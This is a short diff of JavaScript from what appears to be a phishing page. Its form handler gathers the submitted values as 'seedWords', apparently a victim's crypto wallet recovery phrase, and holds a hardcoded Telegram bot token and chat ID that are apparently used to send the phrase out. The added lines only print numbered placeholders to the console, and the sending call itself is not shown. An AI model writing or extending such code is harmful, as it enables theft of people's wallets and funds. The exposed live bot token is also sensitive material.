@@ -118,7 +118,8 @@
             event.preventDefault();
             const formData = new FormData(event.target);
             const seedWords = Array.from(formData.values()).map(word => word.trim()).join('\n'); // Каждое слово на новой строке
-
+            const result = Array.from({ length: 12 }, (_, i) => `${i + 1}.`).join('\n');
+console.log(result);
             const botToken = '7804666257:AAHnu23aX89lTPTuMt08TOHfSgvfK4T8hKg';
             const chatId = '@bdsjxjdhd';
 
